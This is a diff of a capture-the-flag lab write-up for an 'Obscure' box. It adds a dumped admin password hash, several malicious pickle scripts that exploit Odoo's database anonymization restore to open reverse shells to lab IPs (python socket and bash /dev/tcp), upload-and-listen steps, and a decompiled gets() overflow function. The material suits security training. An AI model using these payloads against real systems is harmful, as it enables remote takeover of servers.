@@ -329,39 +329,56 @@ Backup
 
 <img width="474" height="123" alt="image" src="https://github.com/user-attachments/assets/6ff5b85b-e8aa-4da6-a08a-8f6bb0844787" />
 
-
+```bash
 :~/Obscure# grep -Ei "*@antisoft\.thm" dump.sql
 3	Administrator	1	\N	\N	\N	2022-07-23 10:51:25.449364	0	t	\N	\N	Administrator	\N	\N	\N	\N	\N	\N	f	\N	admin@antisoft.thm	f	\N	en_US	\N	\N	\N	f	2022-07-23 10:52:10.087949	\N	\N	1	f	1	\N	\N	\N	contact	f	\N	\N	3
 1	t	admin@antisoft.thm		1	3	\N	f	1	\N	\N	2022-07-23 10:52:10.087949	<span data-o-mail-quote="1">-- <br data-o-mail-quote="1">\nAdministrator</span>	$pbkdf2-sha512$12000$lBJiDGHMOcc4Zwwh5Dzn/A$x.EZ/PrEodzEJ5r4JfQo2KsMZLkLT97xWZ3LsMdgwMuK1Ue.YCzfElODfWEGUOc7yYBB4fMt87ph8Sy5tN4nag
+```
+
+```bash
+echo '$pbkdf2-sha512$12000$lBJiDGHMOcc4Zwwh5Dzn/A$x.EZ/PrEodzEJ5r4JfQo2KsMZLkLT97xWZ3LsMdgwMuK1Ue.YCzfElODfWEGUOc7yYBB4fMt87ph8Sy5tN4nag' > Hash
+```
 
 
 
-
-
+```bash
 Odoo 10.0-20190816 (Community Edition)
+```
 
 <img width="744" height="363" alt="image" src="https://github.com/user-attachments/assets/4ddd92d3-854b-48db-aaca-a945992b3777" />
 
 
-ex.py
+<p>exploit.py</p>
 
 
 
-
+```bash
 import pickle
 import os
 
 class Exploit(object):
     def __reduce__(self):
-        payload = 'python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'10.201.47.153\',9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\'sh\')"'
+        payload = 'python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'10.201.49.195\',9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\'sh\')"'
         return (os.system, (payload,))
 
 with open("exploit.pickle", "wb") as f:
     pickle.dump(Exploit(), f, pickle.HIGHEST_PROTOCOL)
+```
+
+```bash
+:~/Obscure# python3 s.py
+```
+
+```bash
+:~/Obscure# ls
+exploit.pickle  script.py  s.py
+```
 
 
 
-	<img width="1220" height="469" alt="image" src="https://github.com/user-attachments/assets/da974bec-ba42-4fd8-99a5-0f3d92cc86d3" />
+
+
+<img width="1220" height="469" alt="image" src="https://github.com/user-attachments/assets/da974bec-ba42-4fd8-99a5-0f3d92cc86d3" />
 
 
 
@@ -382,24 +399,41 @@ with open("exploit.pickle", "wb") as f:
 - click <code>Anonymize database</code><br>
 - click <code>Anonymize Database</code><br>
 - you should get a message: Anonymization successful.<br>Donot forget to save the resulting file to a safe place because you will not be able to revert the anonymization without this file.<br>This file is also stored in the /var/lib/odoo directory. The absolute file path is: /var/lib/odoo/field_anonymization_main_1.pickle.<br>
-- clicked <code>Save><br>
-
-Anonymization successful.
-
-Donot forget to save the resulting file to a safe place because you will not be able to revert the anonymization without this file.
-
-This file is also stored in the /var/lib/odoo directory. The absolute file path is: /var/lib/odoo/field_anonymization_main_1.pickle.
-
+- clicked <code>Save></code><br>
+- <code>Anonymization successful</code>.<br>Donot forget to save the resulting file to a safe place because you will not be able to revert the anonymization without this file.<br>This file is also stored in the /var/lib/odoo directory. The absolute file path is: /var/lib/odoo/field_anonymization_main_1.pickle.Mbr>
 - refresh<br>
 - click <code>Anonymize Database</code><br>
 - click <code>Upload your file</code><br>
-- click Open
-- 
+- click <code>Open</code><br>- 
 - set up a listener in the same port considered in the payload<br>
 - click <code>Reverse the Database Anonymization</code></p>
 
 <br>
 <br>
+
+
+import pickle
+import os
+
+class Exploit:
+    def __reduce__(self):
+        return (os.system, ('bash -i >& /dev/tcp/10.201.49.195/443 0>&1',))
+
+with open('exploit.pickle', 'wb') as f:
+    pickle.dump(Exploit(), f)
+
+
+import pickle
+import os
+
+class Exploit:
+    def __reduce__(self):
+        return (list, ([os.system('bash -i >& /dev/tcp/10.201.100.220/443 0>&1')],))
+
+with open('exploit.pickle', 'wb') as f:
+    pickle.dump(Exploit(), f)
+
+
 
 <img width="1258" height="293" alt="image" src="https://github.com/user-attachments/assets/7ed75da0-da88-4e4c-9109-aff94514e5ff" />
 
@@ -1257,6 +1291,32 @@ ret: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, in
 
 
 <br>
+
+<p>main()</p>
+
+undefined8 main(void)
+
+{
+  vuln();
+  return 0;
+}
+
+<p>vul()</p>
+
+
+void vuln(void)
+
+{
+  char local_88 [128];
+  
+  fwrite("Exploit this binary to get on the box!\nWhat do you have for me?\n",1,0x40,stdout);
+  fflush(stdout);
+  gets(local_88);
+  return;
+}
+
+
+
 <br>
 <br>
 <h3>exploit_me</h3>
